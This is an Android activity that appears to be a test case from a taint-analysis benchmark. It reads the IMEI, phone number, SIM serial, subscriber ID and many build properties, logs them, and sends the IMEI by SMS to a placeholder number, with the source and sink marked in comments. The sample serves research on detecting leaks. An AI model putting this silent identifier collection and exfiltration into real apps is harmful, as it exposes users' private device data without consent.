
package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;
import android.util.Log;
/**
 * @testcase_name EmulatorConstants
 * Based on BaseBridge
 */
public class EmulatorConstants extends Activity {
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("IBM", "start");
        setContentView(R.layout.emulator_constants);
		
        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source

        String k01 = Build.MANUFACTURER;
        String k02 = Build.MODEL;
        String k03 = Build.PRODUCT;
        @SuppressWarnings("deprecation")
        String k04 = Build.RADIO;
        String k05 = Build.SERIAL;
        String k06 = Build.TAGS;
        String k07 = Build.USER;
        String k08 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
        String k09 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
        String k10 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getNetworkCountryIso();
        int    k11 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getNetworkType();
        String k12 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getNetworkOperator();
        int    k13 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getPhoneType();
        String k14 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        String k15 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimSerialNumber();
        String k16 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSubscriberId();
        String k17 = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getVoiceMailNumber();
        String k18 = Build.CPU_ABI    ;
        String k19 = Build.CPU_ABI2   ;
        String k20 = Build.BOARD      ;
        String k21 = Build.BRAND      ;
        String k22 = Build.DEVICE     ;
        String k23 = Build.FINGERPRINT;
        String k24 = Build.HARDWARE   ;
        String k25 = Build.HOST       ;
        String k26 = Build.ID         ;
        String k27 = Build.VERSION.RELEASE;
        String k28 = Build.VERSION.SDK;
        String k29 = Build.DISPLAY;
        String k30 = DateFormat.format("yyyy-MM-dd kk:mm:ss", Build.TIME).toString();
        String k31 = Build.TYPE;

        Log.d("IBM","Build.MANUFACTURER;"    +k01);
        Log.d("IBM","Build.MODEL;"           +k02);
        Log.d("IBM","Build.PRODUCT;"         +k03);
  		Log.d("IBM","Build.RADIO;"           +k04);
        Log.d("IBM","Build.SERIAL;"          +k05);
        Log.d("IBM","Build.TAGS;"            +k06);
        Log.d("IBM","Build.USER;"            +k07);
        Log.d("IBM","getDeviceId();"         +k08);
        Log.d("IBM","getLine1Number();"      +k09);
        Log.d("IBM","getNetworkCountryIso();"+k10);
        Log.d("IBM","getNetworkType();"      +k11);
        Log.d("IBM","getNetworkOperator();"  +k12);
        Log.d("IBM","getPhoneType();"        +k13);
        Log.d("IBM","getSimCountryIso();"    +k14);
        Log.d("IBM","getSimSerialNumber();"  +k15);
        Log.d("IBM","getSubscriberId();"     +k16);
        Log.d("IBM","getVoiceMailNumber();"  +k17);
		Log.d("IBM","Build.CPU_ABI    ;"     +k18);
        Log.d("IBM","Build.CPU_ABI2   ;"     +k19);
        Log.d("IBM","Build.BOARD      ;"     +k20);
        Log.d("IBM","Build.BRAND      ;"     +k21);
        Log.d("IBM","Build.DEVICE     ;"     +k22);
        Log.d("IBM","Build.FINGERPRINT;"     +k23);
        Log.d("IBM","Build.HARDWARE   ;"     +k24);
        Log.d("IBM","Build.HOST       ;"     +k25);
        Log.d("IBM","Build.ID         ;"     +k26);
        Log.d("IBM","Build.VERSION.RELEASE;" +k27);
        Log.d("IBM","Build.VERSION.SDK;    " +k28);
        Log.d("IBM","Build.DISPLAY;"         +k29);
        Log.d("IBM","Build.TIME;"            +k30);
        Log.d("IBM","Build.TYPE;"            +k31);
        
		SmsManager sms = SmsManager.getDefault();
		Log.d("IBM", "sending SMS: "+imei);
		sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink
		Log.d("IBM", "end");
    }    
}
